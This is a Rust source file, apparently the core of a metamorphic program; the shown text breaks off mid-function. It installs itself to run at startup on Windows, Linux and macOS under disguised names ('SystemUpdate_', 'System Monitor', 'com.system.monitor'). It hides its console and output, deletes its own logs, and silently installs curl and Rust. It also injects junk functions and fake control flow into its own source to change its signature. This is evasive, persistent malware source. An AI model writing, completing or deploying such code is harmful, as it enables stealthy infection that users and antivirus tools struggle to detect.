use base64::Engine;
use base64::engine::general_purpose;
use ctor::ctor;
use dirs;
use once_cell::sync::Lazy;
use rand::{
    Rng,
    distributions::{Alphanumeric, DistString},
    seq::SliceRandom,
    thread_rng,
};
use regex::Regex;
use std::collections::HashMap;
use std::env;
#[cfg(windows)]
use std::ffi::CString;
use std::fs::{self, File};
use std::io::{self, BufRead, BufReader, Read};
#[cfg(windows)]
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::process::{Command, Output, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime};
#[cfg(windows)]
use winapi::um::consoleapi::AllocConsole;
#[cfg(windows)]
use winapi::um::wincon::{FreeConsole, SetConsoleTitleW};
#[cfg(target_os = "windows")]
use winreg::RegKey;
#[cfg(target_os = "windows")]
use winreg::enums::*;

// Static regexes for reuse
static RE_VAR: Lazy<Regex> = Lazy::new(|| Regex::new(r"\bw_[a-zA-Z0-9_]*\b").unwrap());
// Static flag for console output toggle
static CONSOLE_OUTPUT_ENABLED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Toggles console output visibility and creates/destroys console window on Windows
pub fn verbose(enable: bool) {
    let mut console_output = CONSOLE_OUTPUT_ENABLED.lock().unwrap();
    *console_output = enable;

    #[cfg(windows)]
    {
        if enable {
            unsafe {
                AllocConsole();
                let title = CString::new("Metamorphic Logger").unwrap();
                SetConsoleTitleW(title.as_ptr() as *const u16);
            }
        } else {
            unsafe {
                FreeConsole();
            }
        }
    }
}

/// Cleans up lock and log files from previous runs
fn _cleanup_lock_and_log_files() {
    if let Ok(exe_path) = std::env::current_exe() {
        let lock_path = exe_path.with_extension("lock");
        let _ = fs::remove_file(&lock_path);

        // Only delete log file if verbose mode is disabled
        if !*CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
            if let Some(exe_dir) = exe_path.parent() {
                let log_path = exe_dir.join("metamorphic_log.txt");
                let _ = fs::remove_file(&log_path);
            }
        }
    }
}

/// Constructor function that runs cleanup on program start
#[ctor]
fn _early_cleanup() {
    _cleanup_lock_and_log_files();
}

mod logging {
    use super::*;
    use std::fs::{File, OpenOptions};
    use std::io::Write;
    use std::path::Path;
    use std::sync::Mutex;

    /// Logger struct that handles file-based logging
    #[derive(Clone)]
    pub struct Logger {
        file: Arc<Mutex<File>>,
    }

    impl Logger {
        /// Creates a new logger instance with the specified log directory
        pub fn new(log_dir: &Path) -> io::Result<Self> {
            let log_path = if *CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
                // When verbose mode is enabled, save to desktop
                if let Some(desktop_dir) = dirs::desktop_dir() {
                    desktop_dir.join("metacore_log.txt")
                } else {
                    log_dir.join("metacore_log.txt")
                }
            } else {
                log_dir.join("metacore_log.txt")
            };

            let file = OpenOptions::new()
                .create(true)
                .append(true)
                .open(log_path)?;
            Ok(Logger {
                file: Arc::new(Mutex::new(file)),
            })
        }

        /// Logs a debug message with timestamp
        pub fn debug(&self, msg: &str) {
            let timestamp = SystemTime::now()
                .duration_since(SystemTime::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let log_line = format!("[DEBUG][{}] {}\n", timestamp, msg);
            if let Ok(mut file) = self.file.lock() {
                let _ = file.write_all(log_line.as_bytes());
                let _ = file.flush();
            }
            if *CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
                println!("{}", log_line.trim());
            }
        }

        /// Logs an error message with timestamp
        pub fn error(&self, msg: &str) {
            let timestamp = SystemTime::now()
                .duration_since(SystemTime::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let log_line = format!("[ERROR][{}] {}\n", timestamp, msg);
            if let Ok(mut file) = self.file.lock() {
                let _ = file.write_all(log_line.as_bytes());
                let _ = file.flush();
            }
            if *CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
                eprintln!("{}", log_line.trim());
            }
        }
    }

    /// Global debug logging function
    pub fn debug(msg: &str) {
        let log_dir = if *CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
            dirs::desktop_dir().unwrap_or_else(|| std::env::temp_dir())
        } else {
            std::env::temp_dir()
        };
        let logger = Logger::new(&log_dir).unwrap();
        logger.debug(msg);
    }

    /// Global error logging function
    pub fn error(msg: &str) {
        let log_dir = if *CONSOLE_OUTPUT_ENABLED.lock().unwrap() {
            dirs::desktop_dir().unwrap_or_else(|| std::env::temp_dir())
        } else {
            std::env::temp_dir()
        };
        let logger = Logger::new(&log_dir).unwrap();
        logger.error(msg);
    }
}

struct LockFile {
    _file: Option<File>,
}

impl LockFile {
    fn new(lock_dir: &Path) -> Self {
        let lock_path = lock_dir.join("metamorphic.lock");
        let file = File::create(&lock_path).ok();
        LockFile { _file: file }
    }

    fn is_acquired(&self) -> bool {
        self._file.is_some()
    }
}

#[cfg(target_os = "windows")]
pub fn add_to_startup() -> Result<(), io::Error> {
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path
        .to_str()
        .ok_or_else(|| {
            io::Error::new(io::ErrorKind::Other, "Executable path is not valid Unicode")
        })?
        .to_string();

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_QUERY_VALUE | KEY_SET_VALUE,
    )?;

    for name in run_key.enum_values().flatten() {
        let (key_name, value) = name;
        let val = String::from_utf8_lossy(&value.bytes).to_string();
        if val == exe_path_str && key_name.starts_with("SystemUpdate_") {
            logging::debug(&format!(
                "Already in startup: {} -> {}",
                key_name, exe_path_str
            ));
            return Ok(());
        }
    }

    let key_name = format!(
        "SystemUpdate_{}",
        Alphanumeric.sample_string(&mut rand::thread_rng(), 8)
    );

    run_key.set_value(&key_name, &exe_path_str)?;

    logging::debug(&format!(
        "Added to Windows startup: {} -> {}",
        key_name, exe_path_str
    ));
    Ok(())
}

#[cfg(target_os = "linux")]
pub fn add_to_startup() -> Result<(), io::Error> {
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path
        .to_str()
        .ok_or_else(|| {
            io::Error::new(io::ErrorKind::Other, "Executable path is not valid Unicode")
        })?
        .to_string();

    let home_dir = dirs::home_dir()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Failed to get home directory"))?;
    let autostart_dir = home_dir.join(".config/autostart");
    let desktop_file = autostart_dir.join("system-monitor.desktop");

    if desktop_file.exists() {
        let mut file = File::open(&desktop_file)?;
        let mut content = String::new();
        file.read_to_string(&mut content)?;
        if content.contains(&exe_path_str) {
            logging::debug(&format!(
                "Already in Linux startup: {}",
                desktop_file.display()
            ));
            return Ok(());
        }
    }

    fs::create_dir_all(&autostart_dir)?;

    let desktop_content = format!(
        "[Desktop Entry]\n\
        Type=Application\n\
        Name=System Monitor\n\
        Exec={} >/dev/null 2>&1\n\
        Hidden=false\n\
        NoDisplay=false\n\
        X-GNOME-Autostart-enabled=true\n",
        exe_path_str
    );

    fs::write(&desktop_file, desktop_content)?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&desktop_file, fs::Permissions::from_mode(0o644))?;
    }

    logging::debug(&format!(
        "Added to Linux startup: {}",
        desktop_file.display()
    ));
    Ok(())
}

#[cfg(target_os = "macos")]
pub fn add_to_startup() -> Result<(), io::Error> {
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path
        .to_str()
        .ok_or_else(|| {
            io::Error::new(io::ErrorKind::Other, "Executable path is not valid Unicode")
        })?
        .to_string();

    let home_dir = dirs::home_dir()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Failed to get home directory"))?;
    let launch_agents_dir = home_dir.join("Library/LaunchAgents");
    let plist_label = format!(
        "com.system.monitor.{}",
        Alphanumeric.sample_string(&mut rand::thread_rng(), 8)
    );
    let plist_file = launch_agents_dir.join(format!("{}.plist", plist_label));

    if let Ok(entries) = fs::read_dir(&launch_agents_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|s| s.to_str()) == Some("plist") {
                let mut file = File::open(&path)?;
                let mut content = String::new();
                file.read_to_string(&mut content)?;
                if content.contains(&exe_path_str) {
                    logging::debug(&format!("Already in macOS startup: {}", path.display()));
                    return Ok(());
                }
            }
        }
    }

    fs::create_dir_all(&launch_agents_dir)?;

    let plist_content = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \
        \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
        <plist version=\"1.0\">\n\
        <dict>\n\
        <key>Label</key><string>{}</string>\n\
        <key>ProgramArguments</key>\n\
        <array><string>{}</string></array>\n\
        <key>RunAtLoad</key><true/>\n\
        <key>StandardOutPath</key><string>/dev/null</string>\n\
        <key>StandardErrorPath</key><string>/dev/null</string>\n\
        </dict>\n\
        </plist>",
        plist_label, exe_path_str
    );

    fs::write(&plist_file, plist_content)?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&plist_file, fs::Permissions::from_mode(0o644))?;
    }

    Command::new("launchctl")
        .args([
            "load",
            "-w",
            plist_file
                .to_str()
                .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Invalid plist path"))?,
        ])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;

    logging::debug(&format!("Added to macOS startup: {}", plist_file.display()));
    Ok(())
}

pub fn check_rust() -> bool {
    // First try with PATH
    let mut cmd = Command::new("cargo");
    cmd.arg("--version");
    #[cfg(windows)]
    {
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    let output = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(output) if output.status.success() => {
            logging::debug(&format!(
                "Cargo is installed: {}",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
            return true;
        }
        _ => {
            // If not found in PATH, try with explicit path
            if let Some(home_dir) = dirs::home_dir() {
                let cargo_path = if cfg!(windows) {
                    home_dir.join(".cargo/bin/cargo.exe")
                } else {
                    home_dir.join(".cargo/bin/cargo")
                };

                if cargo_path.exists() {
                    let mut cmd = Command::new(cargo_path);
                    cmd.arg("--version");
                    #[cfg(windows)]
                    {
                        cmd.creation_flags(CREATE_NO_WINDOW);
                    }
                    let output = cmd
                        .stdin(Stdio::null())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output();

                    if let Ok(output) = output {
                        if output.status.success() {
                            logging::debug(&format!(
                                "Cargo found at explicit path: {}",
                                String::from_utf8_lossy(&output.stdout).trim()
                            ));
                            return true;
                        }
                    }
                }
            }
            logging::debug("Cargo not found. Rust is likely not installed.");
            false
        }
    }
}

pub fn detect_target_triple() -> Result<String, std::io::Error> {
    logging::debug("Starting target triple detection...");

    if cfg!(target_os = "windows") {
        let arch = std::env::var("PROCESSOR_ARCHITECTURE")
            .unwrap_or_default()
            .to_lowercase();
        logging::debug(&format!("Windows architecture detected: {}", arch));

        if arch.contains("arm64") || arch.contains("aarch64") {
            logging::debug("Detected ARM64 architecture");
            Ok("aarch64-pc-windows-msvc".to_string())
        } else if arch.contains("x86") || arch.contains("amd64") {
            logging::debug("Detected x86_64 architecture");
            Ok("x86_64-pc-windows-msvc".to_string())
        } else {
            logging::debug("Defaulting to x86_64 architecture");
            Ok("x86_64-pc-windows-msvc".to_string())
        }
    } else if cfg!(target_os = "macos") {
        logging::debug("Detected macOS system");
        let uname_output = Command::new("uname")
            .arg("-m")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output();

        match uname_output {
            Ok(output) => {
                let arch = String::from_utf8_lossy(&output.stdout).trim().to_string();
                logging::debug(&format!("macOS architecture detected: {}", arch));

                if arch == "arm64" {
                    logging::debug("Detected ARM64 architecture");
                    Ok("aarch64-apple-darwin".to_string())
                } else if arch == "x86_64" {
                    logging::debug("Detected x86_64 architecture");
                    Ok("x86_64-apple-darwin".to_string())
                } else {
                    logging::debug("Defaulting to x86_64 architecture");
                    Ok("x86_64-apple-darwin".to_string())
                }
            }
            Err(e) => {
                logging::error(&format!("Failed to detect macOS architecture: {}", e));
                Ok("x86_64-apple-darwin".to_string())
            }
        }
    } else {
        logging::debug("Detected Linux system");
        let uname_output = Command::new("uname")
            .arg("-m")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output();

        match uname_output {
            Ok(output) => {
                let arch = String::from_utf8_lossy(&output.stdout).trim().to_string();
                logging::debug(&format!("Linux architecture detected: {}", arch));

                match arch.as_str() {
                    "x86_64" => {
                        logging::debug("Detected x86_64 architecture");
                        Ok("x86_64-unknown-linux-gnu".to_string())
                    }
                    "aarch64" | "arm64" => {
                        logging::debug("Detected ARM64 architecture");
                        Ok("aarch64-unknown-linux-gnu".to_string())
                    }
                    "armv7l" => {
                        logging::debug("Detected ARMv7 architecture");
                        Ok("armv7-unknown-linux-gnueabihf".to_string())
                    }
                    "arm" => {
                        logging::debug("Detected ARM architecture");
                        Ok("arm-unknown-linux-gnueabihf".to_string())
                    }
                    "i686" | "i386" => {
                        logging::debug("Detected i686 architecture");
                        Ok("i686-unknown-linux-gnu".to_string())
                    }
                    _ => {
                        logging::debug("Defaulting to x86_64 architecture");
                        Ok("x86_64-unknown-linux-gnu".to_string())
                    }
                }
            }
            Err(e) => {
                logging::error(&format!("Failed to detect Linux architecture: {}", e));
                Ok("x86_64-unknown-linux-gnu".to_string())
            }
        }
    }
}

pub fn install_rust(target_triple: &str) -> io::Result<()> {
    logging::debug(&format!(
        "Attempting to install Rust for target: {}",
        target_triple
    ));

    #[cfg(unix)]
    {
        // First, ensure curl is installed
        logging::debug("Checking if curl is installed...");
        let curl_check = Command::new("which")
            .arg("curl")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .output()?;

        if !curl_check.status.success() {
            logging::debug("curl not found, attempting to install...");
            // Try all package managers in sequence
            let package_managers = [
                "apt-get update && apt-get install -y curl",
                "yum install -y curl",
                "brew install curl",
                "pacman -S --noconfirm curl",
                "apk add curl",
                "zypper install -y curl",
            ];

            let mut installed = false;
            for cmd in package_managers.iter() {
                let mut install_curl = Command::new("sh");
                install_curl
                    .arg("-c")
                    .arg(cmd)
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                let curl_install = install_curl.output()?;
                if curl_install.status.success() {
                    installed = true;
                    logging::debug(&format!("Successfully installed curl using: {}", cmd));
                    break;
                }
            }

            if !installed {
                logging::error("Failed to install curl automatically.");
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    "Failed to install curl automatically.",
                ));
            }
        }

        // Get home directory
        logging::debug("Getting home directory...");
        let home_dir = dirs::home_dir()
            .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Failed to get home directory"))?;
        let cargo_bin = home_dir.join(".cargo/bin");
        let cargo_env = home_dir.join(".cargo/env");

        // Create .cargo directory if it doesn't exist
        fs::create_dir_all(&cargo_bin)?;

        // Function to run a command and retry if it fails
        fn run_with_retry(cmd: &str, max_retries: u32) -> io::Result<()> {
            let mut retries = 0;
            while retries < max_retries {
                let output = Command::new("sh")
                    .arg("-c")
                    .arg(cmd)
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()?;

                if output.status.success() {
                    return Ok(());
                }

                retries += 1;
                if retries < max_retries {
                    logging::debug(&format!(
                        "Command failed, retrying ({}/{})...",
                        retries, max_retries
                    ));
                    thread::sleep(Duration::from_secs(2));
                }
            }
            Err(io::Error::new(
                io::ErrorKind::Other,
                "Command failed after retries",
            ))
        }

        logging::debug("Downloading and running rustup-init...");

        // Step 1: Download and run rustup-init
        let rustup_cmd = format!(
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable --no-modify-path"
        );
        run_with_retry(&rustup_cmd, 3)?;

        // Step 2: Source the environment and set up rustup
        let setup_cmd = format!(
            "set -a && \
             . {} && \
             set +a && \
             export PATH=\"{}:$PATH\" && \
             {} default stable && \
             {} target add {} && \
             {} update && \
             {} component add rust-src rust-analyzer",
            cargo_env.display(),
            cargo_bin.display(),
            cargo_bin.join("rustup").display(),
            cargo_bin.join("rustup").display(),
            target_triple,
            cargo_bin.join("rustup").display(),
            cargo_bin.join("rustup").display()
        );
        run_with_retry(&setup_cmd, 3)?;

        // Step 3: Update current process environment
        let env_update_cmd = format!(
            "set -a && \
             . {} && \
             set +a && \
             export PATH=\"{}:$PATH\"",
            cargo_env.display(),
            cargo_bin.display()
        );
        run_with_retry(&env_update_cmd, 3)?;

        // Step 4: Verify installation
        let mut retries = 0;
        while retries < 5 {
            if check_rust() {
                logging::debug("Rust installation verified successfully");
                return Ok(());
            }
            retries += 1;
            logging::debug(&format!("Verification attempt {}/5...", retries));
            thread::sleep(Duration::from_secs(2));
        }

        Err(io::Error::new(
            io::ErrorKind::Other,
            "Failed to verify Rust installation after multiple attempts",
        ))
    }

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        // Function to run a command and retry if it fails
        fn run_with_retry(cmd: &str, max_retries: u32) -> io::Result<()> {
            let mut retries = 0;
            while retries < max_retries {
                let output = Command::new("cmd")
                    .arg("/C")
                    .arg(cmd)
                    .creation_flags(CREATE_NO_WINDOW)
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()?;

                if output.status.success() {
                    return Ok(());
                }

                retries += 1;
                if retries < max_retries {
                    logging::debug(&format!(
                        "Command failed, retrying ({}/{})...",
                        retries, max_retries
                    ));
                    thread::sleep(Duration::from_secs(2));
                }
            }
            Err(io::Error::new(
                io::ErrorKind::Other,
                "Command failed after retries",
            ))
        }

        logging::debug("Getting home directory...");
        let home_dir = dirs::home_dir()
            .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Failed to get home directory"))?;
        let cargo_bin = home_dir.join(".cargo/bin");
        let cargo_env = home_dir.join(".cargo/env");
        let rustup_exe = cargo_bin.join("rustup.exe");

        // Create .cargo directory if it doesn't exist
        fs::create_dir_all(&cargo_bin)?;

        let is_arm64 = target_triple.contains("aarch64");
        let url = if is_arm64 {
            "https://static.rust-lang.org/rustup/dist/aarch64-pc-windows-msvc/rustup-init.exe"
        } else {
            "https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe"
        };

        logging::debug(&format!("Downloading rustup-init from: {}", url));
        let temp_dir = env::temp_dir();
        let rustup_init_path = temp_dir.join("rustup-init.exe");

        // Download rustup-init.exe with retries
        let download_cmd = format!("curl -o {} {} -s", rustup_init_path.display(), url);
        run_with_retry(&download_cmd, 3)?;

        logging::debug("Running rustup-init.exe...");

        // Step 1: Run rustup-init
        let init_cmd = format!(
            "{} --default-toolchain stable -y",
            rustup_init_path.display()
        );
        run_with_retry(&init_cmd, 3)?;

        // Step 2: Set up rustup and update environment
        let setup_cmd = format!(
            "call {} && \
             set PATH={};%PATH% && \
             {} default stable && \
             {} target add {} && \
             {} update && \
             {} component add rust-src rust-analyzer",
            cargo_env.display(),
            cargo_bin.display(),
            rustup_exe.display(),
            rustup_exe.display(),
            target_triple,
            rustup_exe.display(),
            rustup_exe.display()
        );
        run_with_retry(&setup_cmd, 3)?;

        // Step 3: Update current process environment
        let env_update_cmd = format!(
            "call {} && \
             set PATH={};%PATH%",
            cargo_env.display(),
            cargo_bin.display()
        );
        run_with_retry(&env_update_cmd, 3)?;

        // Clean up rustup-init.exe
        let _ = fs::remove_file(&rustup_init_path);

        // Step 4: Verify installation
        let mut retries = 0;
        while retries < 5 {
            if check_rust() {
                logging::debug("Rust installation verified successfully");
                return Ok(());
            }
            retries += 1;
            logging::debug(&format!("Verification attempt {}/5...", retries));
            thread::sleep(Duration::from_secs(2));
        }

        Err(io::Error::new(
            io::ErrorKind::Other,
            "Failed to verify Rust installation after multiple attempts",
        ))
    }
}

// Enum to represent encryption methods
#[derive(Clone, Copy)]
enum EncryptionMethod {
    Base64,
    Xor(u8), // XOR with a random key
}

// Function to generate a random encryption method
fn random_encryption_method() -> EncryptionMethod {
    let mut rng = rand::thread_rng();
    let methods = [
        EncryptionMethod::Base64,
        EncryptionMethod::Xor(rng.gen_range(1..=255)), // Random XOR key
    ];
    *methods.choose(&mut rng).unwrap()
}

fn _generate_random_ident(_prefix: &str) -> String {
    let mut rng = thread_rng();
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        .chars()
        .collect();
    (0..10)
        .map(|_| chars[rng.gen_range(0..chars.len())])
        .collect()
}

fn _generate_random_type() -> String {
    let mut rng = thread_rng();
    let types = ["String", "i32", "u32", "bool"];
    types[rng.gen_range(0..types.len())].to_string()
}

fn _generate_random_value() -> String {
    let mut rng = thread_rng();
    match rng.gen_range(0..4) {
        0 => format!(
            "vec![{}]",
            (0..rng.gen_range(1..6))
                .map(|_| rng.gen_range(-1000..1000).to_string())
                .collect::<Vec<_>>()
                .join(", ")
        ),
        1 => format!("\"{}\".to_string()", _generate_random_ident("")),
        2 => rng.gen_range(-1000..1000).to_string(),
        3 => format!(
            "[{}]",
            (0..5)
                .map(|_| rng.gen_range(-1000..1000).to_string())
                .collect::<Vec<_>>()
                .join(", ")
        ),
        _ => "0".to_string(),
    }
}

fn _generate_random_operation() -> String {
    let mut rng = thread_rng();
    let var_name = format!("_var_{}", _generate_random_ident(""));
    let operation_type = rng.gen_range(0..3); // Reduced to 3 simple operations

    match operation_type {
        0 => format!("let {} = {};", var_name, rng.gen_range(-1000..1000)),
        1 => format!("let mut {} = {};", var_name, rng.gen_range(-1000..1000)),
        2 => format!(
            "let {} = \"{}\".to_string();",
            var_name,
            _generate_random_ident("")
        ),
        _ => format!("let {} = 0;", var_name),
    }
}

fn _generate_junk_function() -> String {
    let name = format!("func_{}", _generate_random_ident(""));
    let mut rng = thread_rng();

    // Generate 2-5 random operations
    let num_ops = rng.gen_range(2..6);
    let operations: Vec<String> = (0..num_ops).map(|_| _generate_random_operation()).collect();

    format!("fn {}() {{\n    {}\n}}", name, operations.join("\n    "))
}

fn _add_control_flow_obfuscation(function_body: &str, is_main: bool) -> String {
    let mut rng = rand::thread_rng();
    let lines: Vec<&str> = function_body.lines().collect();
    let mut new_lines = Vec::new();
    let mut brace_depth = 0;
    let mut in_match = false;
    let mut in_match_arm = false;
    let mut in_closure = false;
    let mut in_struct = false;
    let mut in_enum = false;
    let mut in_trait = false;
    let mut in_impl = false;
    let mut in_macro = false;
    let mut in_attribute = false;
    let mut in_string = false;
    let mut escape = false;

    for (i, line) in lines.iter().enumerate() {
        let trimmed_line = line.trim();
        let indent = line
            .chars()
            .take_while(|&c| c.is_whitespace())
            .collect::<String>();

        // Track string literals
        for c in trimmed_line.chars() {
            if in_string {
                if escape {
                    escape = false;
                } else if c == '\\' {
                    escape = true;
                } else if c == '"' {
                    in_string = false;
                }
            } else if c == '"' {
                in_string = true;
            }
        }

        // Skip processing if we're in a string
        if in_string {
            new_lines.push(line.to_string());
            continue;
        }

        // Track brace depth and special contexts
        brace_depth += trimmed_line.chars().filter(|&c| c == '{').count() as i32;
        brace_depth -= trimmed_line.chars().filter(|&c| c == '}').count() as i32;

        // Detect special contexts
        if trimmed_line.starts_with("match ") {
            in_match = true;
        }
        if trimmed_line.starts_with("struct ") {
            in_struct = true;
        }
        if trimmed_line.starts_with("enum ") {
            in_enum = true;
        }
        if trimmed_line.starts_with("trait ") {
            in_trait = true;
        }
        if trimmed_line.starts_with("impl ") {
            in_impl = true;
        }
        if trimmed_line.contains("#[") {
            in_attribute = true;
        }
        if trimmed_line.contains("!") && trimmed_line.contains("(") {
            in_macro = true;
        }

        // Reset contexts when exiting blocks
        if brace_depth == 0 {
            if in_match && !trimmed_line.starts_with("match ") {
                in_match = false;
                in_match_arm = false;
            }
            if in_struct && !trimmed_line.starts_with("struct ") {
                in_struct = false;
            }
            if in_enum && !trimmed_line.starts_with("enum ") {
                in_enum = false;
            }
            if in_trait && !trimmed_line.starts_with("trait ") {
                in_trait = false;
            }
            if in_impl && !trimmed_line.starts_with("impl ") {
                in_impl = false;
            }
            if in_attribute && !trimmed_line.contains("#[") {
                in_attribute = false;
            }
            if in_macro && !trimmed_line.contains("!") {
                in_macro = false;
            }
        }

        // Detect match arms
        if in_match && trimmed_line.contains("=>") {
            in_match_arm = true;
        }
        if in_match_arm && (trimmed_line.ends_with('}') || brace_depth == 0) {
            in_match_arm = false;
        }

        // Detect closures
        if trimmed_line.contains("|") && trimmed_line.contains("{") {
            in_closure = true;
        }
        if in_closure && trimmed_line.ends_with('}') {
            in_closure = false;
        }

        // Skip insertion in problematic contexts
        let skip_insertion = trimmed_line.is_empty()
            || trimmed_line.starts_with("//")
            || trimmed_line.ends_with('.')
            || trimmed_line.contains("return ")
            || trimmed_line.contains(".into_iter()")
            || trimmed_line.contains(".filter")
            || trimmed_line.contains(".map")
            || trimmed_line.contains(".collect()")
            || trimmed_line.contains("unsafe")
            || trimmed_line.contains("extern")
            || trimmed_line.contains("type ")
            || trimmed_line.contains("use ")
            || trimmed_line.contains("mod ")
            || trimmed_line.contains("const ")
            || trimmed_line.contains("static ")
            || in_closure
            || in_match_arm
            || in_match
            || in_struct
            || in_enum
            || in_trait
            || in_impl
            || in_macro
            || in_attribute;

        new_lines.push(line.to_string());

        // Insert control flow after statements, with restrictions
        if !skip_insertion
            && i < lines.len() - 1
            && rng.gen_bool(0.4) // 40% chance for insertion
            && (trimmed_line.ends_with(';') || trimmed_line.ends_with('}'))
            && brace_depth > 0
        // Only insert inside function body
        {
            // For main or top-level functions, use for loops with random data
            if is_main || brace_depth == 1 {
                let num_ops = rng.gen_range(1..4);
                let operations: Vec<String> =
                    (0..num_ops).map(|_| _generate_random_operation()).collect();

                new_lines.push(format!(
                    "{}for _cf_ in 0..{} {{\n{}    {}\n{}}}",
                    indent,
                    rng.gen_range(1..4),
                    indent,
                    operations.join(&format!("\n{}    ", indent)),
                    indent
                ));
            } else {
                let control_flow_type = rng.gen_range(0..2); // 0: if, 1: for
                match control_flow_type {
                    0 => {
                        let random_var = format!("_cf_{}", _generate_random_ident(""));
                        let dummy_value = rng.gen_range(0..1000);
                        let if_ops: Vec<String> = (0..rng.gen_range(1..3))
                            .map(|_| _generate_random_operation())
                            .collect();
                        let else_ops: Vec<String> = (0..rng.gen_range(1..3))
                            .map(|_| _generate_random_operation())
                            .collect();

                        new_lines.push(format!(
                            "{}let {} = {};\n{}if {} > {} {{\n{}    {}\n{}}} else {{\n{}    {}\n{}}}",
                            indent,
                            random_var,
                            dummy_value,
                            indent,
                            random_var,
                            dummy_value - 1,
                            indent,
                            if_ops.join(&format!("\n{}    ", indent)),
                            indent,
                            indent,
                            else_ops.join(&format!("\n{}    ", indent)),
                            indent
                        ));
                    }
                    1 => {
                        let num_ops = rng.gen_range(1..4);
                        let operations: Vec<String> =
                            (0..num_ops).map(|_| _generate_random_operation()).collect();

                        new_lines.push(format!(
                            "{}for _cf_ in 0..{} {{\n{}    {}\n{}}}",
                            indent,
                            rng.gen_range(1..4),
                            indent,
                            operations.join(&format!("\n{}    ", indent)),
                            indent
                        ));
                    }
                    _ => {}
                }
            }
        }
    }

    new_lines.join("\n")
}

fn extract_full_functions(code: &str) -> Vec<(String, String)> {
    let mut functions = Vec::new();
    let mut i = 0;
    let code_bytes = code.as_bytes();

    while let Some(fn_pos) = code[i..].find("fn ") {
        let start = i + fn_pos;
        let mut brace_depth = 0;
        let mut in_string = false;
        let mut escape = false;
        let mut end = start;
        let mut found_open = false;

        while end < code.len() {
            let c = code_bytes[end] as char;

            if in_string {
                if escape {
                    escape = false;
                } else if c == '\\' {
                    escape = true;
                } else if c == '"' {
                    in_string = false;
                }
            } else {
                if c == '"' {
                    in_string = true;
                } else if c == '{' {
                    brace_depth += 1;
                    found_open = true;
                } else if c == '}' {
                    brace_depth -= 1;
                    if brace_depth == 0 && found_open {
                        end += 1;
                        break;
                    }
                }
            }

            end += 1;
        }

        if brace_depth == 0 && found_open {
            let func = &code[start..end];
            let func_name = func
                .split_whitespace()
                .nth(1)
                .unwrap_or("unknown")
                .split('(')
                .next()
                .unwrap_or("unknown")
                .to_string();
            functions.push((func_name, func.to_string()));
        }

        i = end;
    }

    functions
}

fn _check_balanced_delimiters(code: &str) -> bool {
    let mut brace_depth = 0;
    let mut paren_depth = 0;
    let mut in_string = false;
    let mut escape = false;

    for c in code.chars() {
        if in_string {
            if escape {
                escape = false;
            } else if c == '\\' {
                escape = true;
            } else if c == '"' {
                in_string = false;
            }
            continue;
        }

        if c == '"' {
            in_string = true;
        } else if c == '{' {
            brace_depth += 1;
        } else if c == '}' {
            brace_depth -= 1;
            if brace_depth < 0 {
                return false;
            }
        } else if c == '(' {
            paren_depth += 1;
        } else if c == ')' {
            paren_depth -= 1;
            if paren_depth < 0 {
                return false;
            }
        }
    }

    brace_depth == 0 && paren_depth == 0
}

fn _transform_source(
    source_code: &str,
    _original_content: &str,
    junk_function_count: usize,
) -> io::Result<String> {
    let marker_start = "// METAMORPHIC_MARKER_START";
    let marker_end = "// METAMORPHIC_MARKER_END";

    let start_idx = source_code
        .find(marker_start)
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Marker start not found"))?;
    let end_idx = source_code
        .find(marker_end)
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Marker end not found"))?;

    let before = &source_code[..start_idx];
